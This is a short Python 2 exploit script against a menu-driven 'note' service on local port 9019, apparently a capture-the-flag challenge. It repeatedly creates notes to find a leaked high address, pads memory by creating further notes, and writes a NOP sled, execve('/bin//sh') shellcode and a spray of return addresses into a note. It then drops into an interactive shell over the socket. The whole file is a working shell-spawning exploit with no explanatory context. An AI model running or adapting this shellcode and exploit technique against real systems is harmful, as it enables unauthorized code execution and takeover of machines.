from socket import *
from telnetlib import *
import time, struct

p = lambda x: struct.pack("<L", x)
up = lambda x: struct.unpack("<L", x)[0]

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\x31\xd2\xcd\x80"
baseaddress = 0xffffd59c

def recvuntil(t):
        data = ''
        while not data.endswith(t):
                tmp = s.recv(1)
                if not tmp: break
                data += tmp
        return data

while True:
        s = socket(AF_INET, SOCK_STREAM)
        s.connect(('0.0.0.0', 9019))
        recvuntil("5. exit\n")
        while True:
                s.send("1\n")
                data = recvuntil("5. exit\n")
                addr = int(data.split("[")[1][0:8],16)
                if addr > 0xfff00000:
			print "[*] Find!! address : %s" % str(hex(addr))
			keep = baseaddress - addr
			pad = keep / 1072
			for i in range(0, pad):
				s.send("6\n")
				recvuntil("5. exit\n")
			
			s.send("2\n")
			recvuntil("note no?\n")
			s.send("0\n")
			recvuntil("byte)\n")
			payload = ''
			payload += "\x90"*23
			payload += shellcode
			payload += p(addr+20)*((4092 - len(shellcode))/4)
                        s.send(payload + "\n")
			data = recvuntil("5. exit\n")
			print "Ok1"
			s.send("5\n")
                        t = Telnet()
                        t.sock = s
                        t.interact()
                        raw_input()
			break;

                s.send("4\n")
                recvuntil("note no?\n")
                s.send("0\n")
                recvuntil("5. exit\n")

        s.close()